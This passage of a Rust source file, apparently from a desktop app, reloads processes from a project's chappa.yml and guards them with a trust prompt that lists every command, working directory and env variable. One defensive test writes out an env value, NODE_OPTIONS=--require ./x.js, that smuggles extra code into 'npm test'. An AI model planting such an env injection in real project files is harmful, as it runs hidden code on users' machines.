                            ProcessStatus::Starting | ProcessStatus::Running
                        );
                    if live && !trusted {
                        // Untrusted new definition of a RUNNING process: stop
                        // it (the old command must not keep running under a
                        // definition the user never saw) and hold the restart
                        // until the gate is answered.
                        held_back.push(name.clone());
                        let status = proc.lifecycle.on(ProcessEvent::Stop, now_ms());
                        proc.generation += 1;
                        if let Some(term_id) = proc.term_id.take() {
                            registry.close(term_id);
                            source_gone(
                                &inner.sources,
                                &root,
                                &name,
                                &proc.def,
                                "was stopped until its new definition is trusted",
                            );
                        }
                        emit_status(app, id, &name, status, proc.exit_code, None);
                    } else if live {
                        // Validate the new spec BEFORE touching the running
                        // process: a bad working_dir must leave the old
                        // command running with its true status, not report
                        // Failed over a still-live child.
                        match build_spec(&proc.def, &root, &settings) {
                            Err(e) => {
                                log::warn!(
                                    "reload: `{name}` keeps running on its old definition — the new one does not spawn: {e}"
                                );
                            }
                            Ok(_) => {
                                proc.lifecycle.on(ProcessEvent::Stop, now_ms());
                                proc.generation += 1;
                                let record = begin_command_run(inner, id, &name);
                                let sources = inner.sources.clone();
                                if let Err(e) = spawn_process(
                                    registry,
                                    app,
                                    projects.clone(),
                                    &sources,
                                    id,
                                    &name,
                                    root.clone(),
                                    &settings,
                                    &mut proc,
                                    record,
                                ) {
                                    log::warn!("reload: restart of `{name}` failed: {e}");
                                    proc.lifecycle.on(ProcessEvent::SpawnFailed, now_ms());
                                    emit_status(
                                        app,
                                        id,
                                        &name,
                                        ProcessStatus::Failed,
                                        None,
                                        proc.term_id,
                                    );
                                }
                            }
                        }
                    }
                } else if diff.policy_only.contains(&name) {
                    proc.def = def;
                }
                proc
            }
        };
        processes.insert(name, proc);
    }
    // Whatever is left in `old` was removed from the file: stop it.
    for (name, mut proc) in old {
        proc.generation += 1;
        proc.watcher = None;
        proc.watcher_rx = None;
        if let Some(term_id) = proc.term_id.take() {
            registry.close(term_id);
            source_gone(
                &inner.sources,
                &root,
                &name,
                &proc.def,
                "was removed from chappa.yml",
            );
        }
    }
    settle_undeclared(&inner.sources, &root, undeclared, trusted, &declared);
    let mut processes = processes;
    let mut relaunch = if trusted {
        trust_stack_definitions(&mut processes, &stacks)
    } else {
        Vec::new()
    };
    // The project's own gitleaks config: re-pinned when trusted; while not,
    // the old pin stays (the scans see the file differ and fall back).
    let prev_pin = inner.runtimes[&id].scan_config.clone();
    let scan_pin = next_scan_pin(&prev_pin, scan.as_ref(), trusted);
    for n in pin_scan_config(&mut processes, &scan_pin) {
        if !relaunch.contains(&n) {
            relaunch.push(n);
        }
    }
    if let Some(s) = scan.as_ref().and_then(|s| s.problem().map(|p| (s, p))) {
        log::warn!(
            "{}: secretScan.config {} is not used: {}",
            root.display(),
            s.0.rel,
            s.1
        );
    }
    let trust_commands = if trusted {
        Vec::new()
    } else {
        // A changed stack definition always asks, even when no command of
        // the file itself would start; so does a changed gitleaks config,
        // shown with what changed since it was last trusted.
        let mut others = crate::stack_trust::prompt_lines(&stacks);
        if let Some(s) = &scan {
            let last = inner
                .store
                .as_ref()
                .and_then(|st| st.get(id))
                .and_then(|p| p.trusted_scan_config.clone());
            others.push(s.prompt_entry(last.as_deref()));
        }
        trust_prompt_entries(&processes, &held_back, others)
    };
    {
        let app_handle = inner.app.clone();
        let rt = inner.runtimes.get_mut(&id).unwrap();
        rt.scan_config = scan_pin;
        rt.scan_config_watcher = scan_config_watcher_for(
            app_handle,
            projects.clone(),
            registry.clone(),
            id,
            rt.scan_config_watcher.take(),
            &rt.scan_config,
        );
    }
    // Commands the file added are records too (no write when nothing is new).
    let names: Vec<String> = processes.keys().cloned().collect();
    if let Err(e) = inner
        .store
        .as_mut()
        .unwrap()
        .ensure_command_record_ids(id, &names)
    {
        log::warn!("reload project {id}: command record ids not assigned: {e}");
    }
    inner.runtimes.get_mut(&id).unwrap().processes = processes;
    relaunch_locked(inner, registry, app, projects.clone(), id, &relaunch);
    // The diff may have stopped, restarted, added or dropped processes.
    inner.notify_changed();
    emit_reloaded(app, id, None, !trusted, &trust_commands, &trust_hash);
}

/// The trust prompt's entries for `processes`, in file order, followed by
/// `others` (the stack definitions' and the scan config's entries): empty
/// when nothing would run without a click — no auto-start command, no
/// held-back restart, no other entry — which the frontend confirms
/// silently. Otherwise EVERY command the file defines is listed, whether it
/// auto-starts or not: confirming trusts the whole file, so a command left
/// off the list would be trusted without anyone having seen it.
///
/// The ask is about the whole file, not about what this reload changed:
/// listing only the changes let content through unseen (a new command on a
/// stopped process, an `auto_start` flip, or a gate skipped on an earlier
/// reload all produced an empty list).
fn trust_prompt_entries(
    processes: &IndexMap<String, ProcessRuntime>,
    held_back: &[String],
    others: Vec<String>,
) -> Vec<String> {
    let asks = processes
        .iter()
        .any(|(name, p)| p.def.auto_start || held_back.contains(name));
    if !asks && others.is_empty() {
        return Vec::new();
    }
    processes
        .iter()
        .map(|(name, p)| trust_entry(name, &p.def, held_back.contains(name)))
        .chain(others)
        .collect()
}

/// One command's entry: its name and when it runs, then [`trust_line`].
fn trust_entry(name: &str, def: &ProcessDef, held_back: bool) -> String {
    let when = if def.auto_start {
        " (auto-start)"
    } else if held_back {
        " (was running)"
    } else {
        ""
    };
    format!(
        "{}{when}: {}",
        stack_core::trust::visible(name),
        trust_line(def)
    )
}

/// One command of the Run/Skip trust prompt: the command, then an indented
/// line for a working_dir and one per env variable. A harmless-looking
/// command is only as harmless as its environment — `NODE_OPTIONS`, `PATH`
/// or `GIT_SSH_COMMAND` can make `npm test` run anything — so the prompt
/// shows everything the definition feeds the process, not just the line.
///
/// Everything is shown exactly as the trust hash covers it: nothing masked
/// (a value that looks like a credential written inline carries a warning
/// beside it instead), and a line break or control character inside a value
/// shown as a glyph, so a value cannot pad the next command out of view.
fn trust_line(def: &ProcessDef) -> String {
    use stack_core::credentials::{detect_argv, warning};
    use stack_core::trust::{prompt_env, prompt_line, visible};
    let mut line = match &def.command {
        CommandLine::Argv(words) => {
            let mut text = visible(&project_model::words::join_words(words));
            if let Some((_, kind)) = detect_argv(words).first() {
                text.push_str(&warning(*kind));
            }
            text
        }
        CommandLine::Shell(text) => prompt_line(text),
    };
    if let Some(dir) = &def.working_dir {
        line.push_str(&format!("\n    in {}", visible(&dir.display().to_string())));
    }
    for (key, value) in &def.env {
        line.push_str(&format!("\n    env {}", prompt_env(key, value)));
    }
    // A source also receives variables the yml does not spell out; the
    // prompt names them so what it lists is everything the process gets.
    if def.is_source() {
        line.push_str(&format!(
            "\n    source: receives {}, {} and {} from the app and is polled for its views",
            crate::sources::identity::ADDR_ENV,
            crate::sources::identity::TOKEN_ENV,
            stack_core::child_env::RESERVED_PORTS_ENV
        ));
    }
    line
}

/// The `chappa.yml` watcher: ONE file, non-recursive, the shared 500ms
/// debounce. `for_chappa_yml`, NOT `new` — the restart matcher's own-artifact
/// exclusion covers the project file itself, and with `new` this watcher
/// filtered out every event it was armed for (found live 2026-08-31; external
/// edits never hot-reloaded).
fn yml_watcher_for(root: &Path) -> Option<(RestartWatcher, Receiver<()>)> {
    let matcher = ChangeMatcher::for_chappa_yml(root.to_path_buf());
    RestartWatcher::start_with_mode(root.to_path_buf(), matcher, RecursiveMode::NonRecursive).ok()
}

/// Per open project: each debounced `chappa.yml` change reloads it. Ends when
/// the project's `yml_watcher` drops (close/remove/reopen/shutdown).
fn start_yml_reload_consumer(
    projects: Arc<Mutex<Inner>>,
    registry: Registry,
    app: AppHandle,
    id: u32,
    rx: Receiver<()>,
) {
    std::thread::spawn(move || {
        while rx.recv().is_ok() {
            let mut inner = match projects.lock() {
                Ok(inner) => inner,
                Err(_) => return,
            };
            if inner.shutting_down {
                return;
            }
            // Our own write-back already reloaded under the
            // lock; the watcher's echo of that write carries the same content
            // hash and is skipped, so the frontend sees ONE reload per edit.
            // A load error keeps the runtime hash stale, so retries still run.
            let same_content = inner.runtimes.get(&id).is_some_and(|r| {
                r.load_error.is_none()
                    && crate::stack_trust::trust_hash_on_disk(&r.root)
                        .is_some_and(|h| h == r.yml_hash)
            });
            if same_content {
                continue;
            }
            reload_locked(&mut inner, &registry, &app, projects.clone(), id);
        }
    });
}

/// Start one process. The frontend supplies the frames Channel (per-terminal
/// webview artifact); the process then runs via the execution profile with its
/// working_dir/env resolved. Idempotent: starting an already-live process is a
/// no-op returning its existing term id.
#[tauri::command]
pub fn start_project_process(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
    name: String,
    frames: Channel<InvokeResponseBody>,
) -> Result<u32, String> {
    Ok(start_process(&app, &registry, &projects, id, name, frames)?)
}

/// Stop one process. Idempotent: stopping a non-running process is a no-op
/// success (measured, 0.7.1), and a stopped process never auto-restarts.
#[tauri::command]
pub fn stop_project_process(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
    name: String,
) -> Result<(), String> {
    Ok(stop_process(&registry, &app, &projects, id, &name)?)
}

/// Restart one process: stop if live, then start (a stopped process just
/// starts — matches the visible actions). Needs a frames Channel because a
/// never-started process has none yet.
#[tauri::command]
pub fn restart_project_process(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
    name: String,
    frames: Channel<InvokeResponseBody>,
) -> Result<u32, String> {
    stop_process(&registry, &app, &projects, id, &name)?;
    Ok(start_process(&app, &registry, &projects, id, name, frames)?)
}

// ---- control surface ---------------------------------------------
//
// The control HTTP server (control_http.rs) drives the SAME lifecycle the
// frontend does, with one schema-forced twist for starts: a spawn needs the
// webview's frames Channel, which Rust cannot fabricate. So `control_start`
// asks the frontend to start the process (`project://start_requested`, the
// exact path a rail click takes) and then waits — bounded — for the runtime
// to show a live term id. Stop is pure Rust. The idempotency rules are the
// ones verbatim: start on live = no-op with the live id, stop on
// non-running = no-op success, restart on stopped = start.

/// One control-surface project row: the stored fields plus whether the
/// project is currently open (only open projects have process runtimes).
#[derive(Debug, Clone, Serialize)]
pub struct ControlProjectDto {
    pub id: u32,
    pub name: String,
    pub path: String,
    pub icon: Option<String>,
    pub open: bool,
    /// Process rows when open (status, term_id, …), empty otherwise.
    pub processes: Vec<ProjectProcessDto>,
}

/// The reply to a control start/stop/restart: the process's current status
/// and term id after the action. `pending` is true when a requested start
/// had not produced a live terminal before the wait ran out (the frontend is
/// busy or gone) — poll `get_project` for the outcome.
#[derive(Debug, Clone, Serialize)]
pub struct ControlLifecycleDto {
    pub project_id: u32,
    pub name: String,
    pub status: &'static str,
    pub term_id: Option<TermId>,
    pub pending: bool,
}

impl Projects {
    /// `list_projects` for the control surface: every stored project.
    pub fn control_list(&self) -> Result<Vec<ControlProjectDto>, ControlError> {
        let inner = self.store()?;
        // `store()` guarantees the store is Some; read it without unwrapping
        // under the lock all the same (a panic here poisons the app's whole
        // project state — the review's rule).
        let Some(store) = inner.store.as_ref() else {
            return Ok(Vec::new());
        };
        Ok(store
            .list()
            .iter()
            .map(|p| control_project_dto(&inner, p))
            .collect())
    }

    /// `get_project(id)` for the control surface; unknown id = error.
    pub fn control_get(&self, id: u32) -> Result<ControlProjectDto, ControlError> {
        let inner = self.store()?;
        let project = inner
            .store
            .as_ref()
            .and_then(|store| store.get(id))
            .ok_or_else(|| ControlError::no_project(id))?;
        Ok(control_project_dto(&inner, project))
    }

    /// Stop one process (idempotency: non-running = no-op success).
    pub fn control_stop(
        &self,
        registry: &Registry,
        id: u32,
        name: &str,
    ) -> Result<ControlLifecycleDto, ControlError> {
        let app = self.app_handle()?;
        stop_process(registry, &app, self, id, name)?;
        self.lifecycle_dto(id, name, false)
    }

    /// Start one process. Live → idempotent no-op with its id. Otherwise the
    /// frontend is asked to start it and we wait up to `wait_ms` for the
    /// spawn to register, answering `pending: true` on timeout rather than
    /// failing — the start is still in flight.
    ///
    /// The wait PARKS on [`Inner::changed`] (cleanup: it used to
    /// re-lock the store every 50ms), so the answer lands as soon as the
    /// frontend's spawn registers instead of up to a tick later, and the
    /// request thread costs nothing while it waits. Every write path that
    /// touches term_id/status/generation notifies that condvar; the deadline
    /// remains the backstop.
    ///
    /// Review: the DTO is built from the SAME lock scope that
    /// inspected the process — `lifecycle_dto` re-locks the non-reentrant
    /// store, and calling it while a guard is alive self-deadlocked the
    /// request thread on the very first idempotent start. Nothing here
    /// unwraps under the lock (a panic would poison the store app-wide), and
    /// nothing bumps `generation` before the frontend has acted: every spawn
    /// (and every failed spawn attempt) bumps it itself, so the counter is
    /// only ever advanced by something that actually happened — an unanswered
    /// request must not cancel a pending auto-restart as a side effect.
    pub fn control_start(
        &self,
        id: u32,
        name: &str,
        wait_ms: u64,
    ) -> Result<ControlLifecycleDto, ControlError> {
        let app = self.app_handle()?;
        let before_generation = {
            let inner = self.store()?;
            let runtime = inner
                .runtimes
                .get(&id)
                .ok_or_else(|| ControlError::not_open(id))?;
            let proc = runtime
                .processes
                .get(name)
                .ok_or_else(|| ControlError::no_process(name, id))?;
            if live_term(proc).is_some() {
                return Ok(lifecycle_dto_of(id, name, proc, false)); // already live
            }
            // Refused here too, before the webview is asked to start it.
            if !content_trusted(&inner, id) {
                return Err(ControlError::untrusted(name));
            }
            proc.generation
        };
        let _ = app.emit(
            "project://start_requested",
            &serde_json::json!({"project_id": id, "name": name}),
        );
        let deadline = Instant::now() + Duration::from_millis(wait_ms);
        let mut inner = self.store()?;
        loop {
            let proc = inner
                .runtimes
                .get(&id)
                .and_then(|r| r.processes.get(name))
                .ok_or_else(|| {
                    ControlError::NotFound(format!("process `{name}` vanished during start"))
                })?;
            let attempted = proc.generation > before_generation;
            let live = attempted && live_term(proc).is_some();
            // A spawn attempt that already failed is an answer too.
            let failed = attempted && proc.lifecycle.status() == ProcessStatus::Failed;
            if live || failed {
                return Ok(lifecycle_dto_of(id, name, proc, false));
            }
            let remaining = deadline.saturating_duration_since(Instant::now());
            if remaining.is_zero() {
                return Ok(lifecycle_dto_of(id, name, proc, true));
            }
            // Park until a write path signals (or the deadline). The predicate
            // above is re-checked under this same lock on every wake, so a
            // signal cannot be missed and a spurious one is free. Never
            // unwrapped: a poisoned lock is reported, not panicked on.
            let changed = inner.changed.clone();
            inner = match changed.wait_timeout(inner, remaining) {
                Ok((inner, _)) => inner,
                Err(_) => return Err(ControlError::Internal("projects state poisoned".to_owned())),
            };
        }
    }

    /// Review: a control-surface close of a terminal that a
    /// project process OWNS must go through the lifecycle (`stop_process`),
    /// or the runtime keeps a dead `term_id` as "running" forever — start
    /// answers "already live", output 404s, auto_restart never fires. Finds
    /// the owner under one lock, then stops it through the normal path.
    /// `Ok(false)` = no project process owns this terminal.
    pub fn stop_owner_of_terminal(
        &self,
        registry: &Registry,
        term_id: TermId,
    ) -> Result<bool, ControlError> {
        let owner = {
            let inner = self.store()?;
            inner.runtimes.iter().find_map(|(pid, r)| {
                r.processes
                    .iter()
                    .find(|(_, p)| p.term_id == Some(term_id))
                    .map(|(name, _)| (*pid, name.clone()))
            })
        };
        match owner {
            Some((pid, name)) => {
                let app = self.app_handle()?;
                stop_process(registry, &app, self, pid, &name)?;
                Ok(true)
            }
            None => Ok(false),
        }
    }

    /// Restart: stop (no-op when not running) then the start path above.
    pub fn control_restart(
        &self,
        registry: &Registry,
        id: u32,
        name: &str,
        wait_ms: u64,
    ) -> Result<ControlLifecycleDto, ControlError> {
        self.control_stop(registry, id, name)?;
        self.control_start(id, name, wait_ms)
    }

    pub fn app_handle(&self) -> Result<AppHandle, ControlError> {
        self.store()?
            .app
            .clone()
            .ok_or_else(|| ControlError::Internal("app handle not initialized".to_owned()))
    }

    fn lifecycle_dto(
        &self,
        id: u32,
        name: &str,
        pending: bool,
    ) -> Result<ControlLifecycleDto, ControlError> {
        let inner = self.store()?;
        let proc = inner
            .runtimes
            .get(&id)
            .and_then(|r| r.processes.get(name))
            .ok_or_else(|| ControlError::no_process(name, id))?;
        Ok(lifecycle_dto_of(id, name, proc, pending))
    }
}

/// The lifecycle answer for a process the caller already holds a reference
/// to (no locking — see `control_start`).
fn lifecycle_dto_of(
    id: u32,
    name: &str,
    proc: &ProcessRuntime,
    pending: bool,
) -> ControlLifecycleDto {
    ControlLifecycleDto {
        project_id: id,
        name: name.to_owned(),
        status: proc.lifecycle.status().as_str(),
        term_id: proc.term_id,
        pending,
    }
}

fn control_project_dto(inner: &Inner, p: &project_model::projects::Project) -> ControlProjectDto {
    ControlProjectDto {
        id: p.id,
        name: p.name.clone(),
        path: p.path.display().to_string(),
        icon: p.icon.clone(),
        open: inner.runtimes.contains_key(&p.id),
        // Same rows the frontend's project view gets (`process_dtos` is empty
        // for a project that is not open, which is exactly this contract).
        processes: process_dtos(inner, p.id),
    }
}

/// The start half of the lifecycle commands; a plain `&Registry` / `&Projects`
/// pair so commands never construct `tauri::State` by hand.
fn start_process(
    app: &AppHandle,
    registry: &Registry,
    projects: &Projects,
    id: u32,
    name: String,
    frames: Channel<InvokeResponseBody>,
) -> Result<u32, ControlError> {
    let mut inner = projects.store()?;
    // Live check + clone the owned pieces BEFORE taking `&mut proc` (borrow
    // discipline: `spawn_process` needs `&mut ProcessRuntime` and an owned
    // root, never a live `&ProjectRuntime` at the same time).
    let live = inner
        .runtimes
        .get(&id)
        .and_then(|r| r.processes.get(&name))
        .and_then(live_term);
    if let Some(term_id) = live {
        return Ok(term_id); // already live: idempotent
    }
    let root = inner
        .runtimes
        .get(&id)
        .map(|r| r.root.clone())
        .ok_or_else(|| ControlError::not_open(id))?;
    let def = inner
        .runtimes
        .get(&id)
        .and_then(|r| r.processes.get(&name))
        .map(|p| p.def.clone())
        .ok_or_else(|| ControlError::no_process(&name, id))?;
    if !content_trusted(&inner, id) {
        return Err(ControlError::untrusted(&name));
    }
    // Read the execution profile + per-actor controls fresh at every
    // start (same borrow discipline — owned clone before `&mut proc`).
    let settings = inner.launch_settings();
    let sources = inner.sources.clone();
    // The run begins only for a spec that can spawn; a failed attempt leaves
    // the record's previous run as it was.
    let spec = build_spec(&def, &root, &settings);
    let record = if spec.is_ok() {
        begin_command_run(&mut inner, id, &name)
    } else {
        None
    };

    let proc = inner
        .runtimes
        .get_mut(&id)
        .and_then(|r| r.processes.get_mut(&name))
        .unwrap();
    proc.channel = Some(frames);
    // A dead-but-registered term (crashed, no auto_restart) lingers in the
    // registry; a user start must not leave it orphaned. Its pump is already
    // finished (the child exited), so closing it under the lock is safe.
    if let Some(term_id) = proc.term_id.take() {
        registry.close(term_id);
    }
    let result = match spec {
        Ok(_) => {
            proc.term_id = None; // force a fresh id on this start
            let spawn = spawn_process(
                registry,
                app,
                projects.arc(),
                &sources,
                id,
                &name,
                root,
                &settings,
                proc,
                record,
            );
            match spawn {
                Ok(term_id) => {
                    proc.backoff.reset();
                    Ok(term_id)
                }
                Err(e) => {
                    proc.lifecycle.on(ProcessEvent::SpawnFailed, now_ms());
                    emit_status(app, id, &name, ProcessStatus::Failed, None, proc.term_id);
                    Err(ControlError::Internal(e))
                }
            }
        }
        Err(e) => {
            // A failed attempt still counts as an attempt: `control_start`
            // waits for the generation to move, and a user action supersedes
            // any scheduled auto-restart the same way a spawn would.
            proc.generation += 1;
            proc.lifecycle.on(ProcessEvent::SpawnFailed, now_ms());
            emit_status(app, id, &name, ProcessStatus::Failed, None, proc.term_id);
            Err(ControlError::Internal(e))
        }
    };
    // Every branch above moved term_id/status/generation — wake `control_start`
    // (which is parked on exactly this) before the guard drops.
    inner.notify_changed();
    result
}

/// The process's terminal WHEN IT COUNTS AS LIVE — the one
/// idempotency rule ("start on live = no-op with the live id"), shared by the
/// frontend start path and `control_start` so the two can never disagree
/// about what "already running" means.
fn live_term(proc: &ProcessRuntime) -> Option<TermId> {
    match proc.lifecycle.status() {
        ProcessStatus::Starting | ProcessStatus::Running => proc.term_id,
        _ => None,
    }
}

/// The stop half of the lifecycle commands; a plain `&Registry` / `&Projects`
/// pair so commands never construct `tauri::State` by hand.
fn stop_process(
    registry: &Registry,
    app: &AppHandle,
    projects: &Projects,
    id: u32,
    name: &str,
) -> Result<(), ControlError> {
    let mut inner = projects.store()?;
    let sources = inner.sources.clone();
    let runtime = inner
        .runtimes
        .get_mut(&id)
        .ok_or_else(|| ControlError::not_open(id))?;
    let root = runtime.root.clone();
    let proc = runtime
        .processes
        .get_mut(name)
        .ok_or_else(|| ControlError::no_process(name, id))?;
    let status = proc.lifecycle.on(ProcessEvent::Stop, now_ms());
    proc.generation += 1; // cancels any scheduled auto-restart / watcher respawn
    let term_id = proc.term_id.take();
    if let Some(term_id) = term_id {
        registry.close(term_id);
        source_gone(&sources, &root, name, &proc.def, "was stopped");
    }
    let exit_code = proc.exit_code;
    inner.notify_changed();
    emit_status(app, id, name, status, exit_code, None);
    Ok(())
}

/// Build the restart_when_changed watcher for a process. The handle is parked
/// in `ProcessRuntime` for the process's lifetime (dropping it stops notify);
/// the receiver carries the debounced restart signals, consumed by the
/// per-process consumer thread started at first spawn. Both are `None` when
/// the yml lists no patterns or every glob was invalid.
fn watcher_for(root: &Path, def: &ProcessDef) -> (Option<RestartWatcher>, Option<Receiver<()>>) {
    if def.restart_when_changed.is_empty() {
        return (None, None);
    }
    let matcher = ChangeMatcher::new(root.to_path_buf(), &def.restart_when_changed);
    if matcher.is_empty() {
        return (None, None); // every glob was invalid — nothing to watch
    }
    match RestartWatcher::start(root.to_path_buf(), matcher) {
        Ok((watcher, rx)) => (Some(watcher), Some(rx)),
        // notify can fail (unwatchable dir, missing inotify): degrade to no
        // watcher rather than failing the whole open.
        Err(_) => (None, None),
    }
}

// ---- DTOs -------------------------------------------------------------------

/// Switcher/header rows: `{id, name, path, icon}` plus the
/// `notificationLevel`.
///
/// `rename_all = "camelCase"` is a no-op for the four original single-word
/// keys and makes the new one land as the wire key `notificationLevel`.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ProjectInfoDto {
    pub id: u32,
    pub name: String,
    pub path: String,
    pub icon: Option<String>,
    /// The badge overrides (initials, palette colour key), or `null` when
    /// the badge derives from the name.
    pub initials: Option<String>,
    pub color: Option<String>,
    /// The RAW project default (`"all" | "important" | "none"`), or
    /// `null` when unset. NOT resolved — resolution (per-process override →
    /// project default → 'all') lives in the UI.
    pub notification_level: Option<String>,
    /// The project's secret-scan override (`true` / `false`), or `null`
    /// when it follows the app setting.
    pub secret_scan: Option<bool>,
}

impl From<&project_model::projects::Project> for ProjectInfoDto {
    fn from(p: &project_model::projects::Project) -> Self {
        Self {
            id: p.id,
            name: p.name.clone(),
            path: p.path.display().to_string(),
            icon: p.icon.clone(),
            initials: p.initials.clone(),
            color: p.color.clone(),
            notification_level: p.notification_level.clone(),
            secret_scan: p.secret_scan,
        }
    }
}

/// One process row in the project view.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ProjectProcessDto {
    pub name: String,
    /// Secrets masked ([`shown_command`]); the real line stays in Rust.
    pub command: String,
    /// The masked fields (`command`, `env.<KEY>`): the editor shows them
    /// with a Replace field and sends [`UNCHANGED`] for the ones it keeps.
    pub masked: Vec<String>,
    pub status: &'static str,
    pub auto_start: bool,
    pub auto_restart: bool,
    pub restart_when_changed: Vec<String>,
    pub term_id: Option<u32>,
    pub exit_code: Option<i32>,
    /// The RAW per-process override for THIS process name (wire key
    /// `notificationLevel`), or `null` when the process has none. NOT
    /// resolved — the UI resolves per-process override → project default →
    /// 'all', so `null` here means "inherit", never 'all'.
    pub notification_level: Option<String>,
    /// The rest of the definition, so `Edit command…` can pre-fill
    /// without a second round trip. `working_dir` as written in the yml
    /// (null = project root); `env` in file order.
    pub working_dir: Option<String>,
    pub env: IndexMap<String, String>,
    /// Chappa-side toggles (projects.json, never the yml).
    pub favorite: bool,
    pub disable_auto_rename: bool,
    /// The command's durable record (assigned when the project is opened)
    /// and the head of its run ledger — the stored view, which the live
    /// terminal's own status refines while one is attached. Wire keys
    /// `recordId` / `lastRun`; the head's own keys stay snake_case (the one
    /// `RunHead` shape every surface shares).
    pub record_id: Option<String>,
    pub last_run: Option<RunHead>,
}

impl ProjectProcessDto {
    /// `overrides` is the stored project's `process_overrides` map;
    /// it is passed in rather than looked up because the caller already holds
    /// the projects lock and the runtime borrow.
    fn from_process(
        name: &str,
        p: &ProcessRuntime,
        overrides: Option<&BTreeMap<String, ProcessOverride>>,
    ) -> Self {
        let record = overrides.and_then(|m| m.get(name));
        Self {
            name: name.to_owned(),
            command: shown_command(&p.def.command),
            masked: masked_fields(&p.def),
            status: p.lifecycle.status().as_str(),
            auto_start: p.def.auto_start,
            auto_restart: p.def.auto_restart,
            restart_when_changed: p.def.restart_when_changed.clone(),
            term_id: p.term_id,
            exit_code: p.exit_code,
            notification_level: record.and_then(|r| r.notification_level.clone()),
            working_dir: p.def.working_dir.as_ref().map(|d| d.display().to_string()),
            env: p
                .def
                .env
                .iter()
                .map(|(k, v)| (k.clone(), stack_core::credentials::mask_env(k, v)))
                .collect(),
            favorite: record.is_some_and(|r| r.favorite),
            disable_auto_rename: record.is_some_and(|r| r.disable_auto_rename),
            record_id: record.and_then(|r| r.record_id.clone()),
            last_run: record.and_then(|r| r.last_run.as_ref().map(Run::head)),
        }
    }
}

/// The `open_project` answer: the project header, the process rows, and — when
/// the current project-file hash isn't trusted — the auto-start command list
/// for the Run/Skip confirm.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct OpenProjectResult {
    pub project: ProjectInfoDto,
    pub trust_pending: bool,
    pub trust_commands: Vec<String>,
    /// The content hash the trust prompt describes; Run sends it back so
    /// exactly that content is trusted (see [`confirm_project_trust`]).
    pub trust_hash: String,
    pub processes: Vec<ProjectProcessDto>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use project_model::settings::ShellProfile;

    fn settings_with(exec: &str, profiles: Vec<ShellProfile>) -> Settings {
        Settings {
            default_exec_profile: exec.to_owned(),
            shell_profiles: profiles,
            ..Settings::default()
        }
    }

    fn profile(name: &str, command: &str, enabled: bool) -> ShellProfile {
        ShellProfile {
            name: name.to_owned(),
            command: command.to_owned(),
            enabled,
        }
    }

    /// The builtin names keep the execution profile byte for byte —
    /// and each builtin is honored EXPLICITLY (the pane
    /// offers both on every platform, so "sh" on Windows must mean sh, not
    /// silently cmd).
    #[test]
    fn builtin_exec_profiles_keep_their_shell_semantics() {
        let (args, env) = cmd_quote_indirection(
            "cmd",
            vec![
                "/C".to_owned(),
                r#"py -c "import time; time.sleep(999)""#.to_owned(),
            ],
        );
        assert_eq!(args, vec!["/C", "call", "%CHAPPA_CMD%"]);
        assert_eq!(
            env,
            vec![(
                "CHAPPA_CMD".to_owned(),
                r#"py -c "import time; time.sleep(999)""#.to_owned()
            )]
        );
        // No quotes → untouched (byte-identical behaviour to before).
        let (args, env) =
            cmd_quote_indirection("cmd", vec!["/C".to_owned(), "py app/x.py".to_owned()]);
        assert_eq!(args, vec!["/C", "py app/x.py"]);
        assert!(env.is_empty());
        // Not cmd → untouched.
        let (args, env) =
            cmd_quote_indirection("sh", vec!["-c".to_owned(), r#"echo "hi""#.to_owned()]);
        assert_eq!(args, vec!["-c", r#"echo "hi""#]);
        assert!(env.is_empty());
        let (program, args) = execution_command("py app/x.py", &settings_with("cmd", vec![]));
        assert_eq!(program, "cmd");
        assert_eq!(args, vec!["/C".to_owned(), "py app/x.py".to_owned()]);

        let (program, args) = execution_command("py app/x.py", &settings_with("sh", vec![]));
        assert_eq!(program, "sh");
        assert_eq!(args, vec!["-c".to_owned(), "py app/x.py".to_owned()]);
    }

    #[test]
    fn run_trusts_only_the_content_the_prompt_showed() {
        assert!(trust_answer_matches(Some("a"), Some("a"), "a").is_ok());
        // Closed project, or a caller that sent no hash: the file decides.
        assert!(trust_answer_matches(None, None, "a").is_ok());
        // The file changed while the dialog was open.
        assert!(trust_answer_matches(Some("a"), Some("a"), "b").is_err());
        // The runtime already reloaded newer content than the prompt showed.
        assert!(trust_answer_matches(Some("a"), Some("b"), "b").is_err());
        assert!(trust_answer_matches(None, Some("a"), "b").is_err());
    }

    #[test]
    fn the_trust_gate_lists_every_command_whenever_something_would_run_unasked() {
        let root = tempfile::tempdir().unwrap();
        let def = |command: &str, auto_start: bool| ProcessDef {
            command: command.into(),
            auto_start,
            ..ProcessDef::default()
        };
        let mut processes = IndexMap::new();
        // Stopped, auto-start, unchanged by this reload: still listed — the
        // next open would start it.
        processes.insert(
            "web".to_owned(),
            fresh_runtime(root.path(), def("npm run dev", true)),
        );
        // Not auto-start, not running: nothing runs it without a click, but
        // trusting covers it too, so it is listed.
        processes.insert(
            "lint".to_owned(),
            fresh_runtime(root.path(), def("npm run lint", false)),
        );
        // Not auto-start but was running and got held back.
        processes.insert(
            "watch".to_owned(),
            fresh_runtime(root.path(), def("npm run watch", false)),
        );
        let listed = trust_prompt_entries(&processes, &["watch".to_owned()], Vec::new());
        assert_eq!(
            listed,
            vec![
                "web (auto-start): npm run dev",
                "lint: npm run lint",
                "watch (was running): npm run watch"
            ]
        );
        // The stack and scan entries come after the commands.
        let with_stack = trust_prompt_entries(&processes, &[], vec!["stack entry".to_owned()]);
        assert_eq!(with_stack.len(), 4);
        assert_eq!(with_stack[3], "stack entry");
        // The environment and working dir are part of what gets trusted.
        let mut sneaky = def("npm test", true);
        sneaky.working_dir = Some(PathBuf::from("tools"));
        sneaky
            .env
            .insert("NODE_OPTIONS".to_owned(), "--require ./x.js".to_owned());
        assert_eq!(
            trust_line(&sneaky),
            "npm test\n    in tools\n    env NODE_OPTIONS=--require ./x.js"
        );
        // Nothing auto-starts, nothing was held back, no stack: an empty
        // list, which is confirmed silently because trusting it runs
        // nothing without a click.
        processes.shift_remove("web");
        assert!(trust_prompt_entries(&processes, &[], Vec::new()).is_empty());
        // A stack definition alone still asks, listing the commands too.
        assert_eq!(
